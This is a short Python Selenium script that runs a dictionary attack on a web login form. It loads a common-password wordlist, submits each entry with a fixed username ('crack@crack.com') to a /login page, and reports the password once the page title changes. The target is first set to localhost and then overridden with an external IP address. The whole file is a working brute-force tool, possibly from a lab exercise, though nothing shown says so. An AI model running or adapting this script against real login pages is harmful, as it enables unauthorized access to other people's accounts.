from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import time

password_txt = "C:\\Users\\rj\\Downloads\\rockyou.txt\\500-worst-passwords.txt"
s = Service(executable_path='C:\\Users\\rj\\Downloads\\chromedriver-win64\\chromedriver-win64\\chromedriver.exe')
driver = webdriver.Chrome(service=s)

website = "http://127.0.0.1:5000/login"
website = "http://141.87.60.67:5000/login"
USERNAME = "crack@crack.com"

driver.get(website)
time.sleep(1)
passwords = []
with open(password_txt, "r") as f:
    for line in f:
        passwords.append(line.strip())
        
for i, password in enumerate(passwords):
    res = driver.find_elements(By.CLASS_NAME, "form-control")
    assert(len(res) == 2)
    res[0].clear()
    res[0].send_keys(USERNAME)
    res[1].clear()
    res[1].send_keys(password)
    
    button = driver.find_elements(By.CLASS_NAME, "btn-old")
    print(len(button))
    button[0].click()
    print("Title page is: " + driver.title)
    if "login" not in driver.title.lower():
        print("----------------------")
        print(f"Password found for user {USERNAME} : {password}")
        break
        
driver.quit()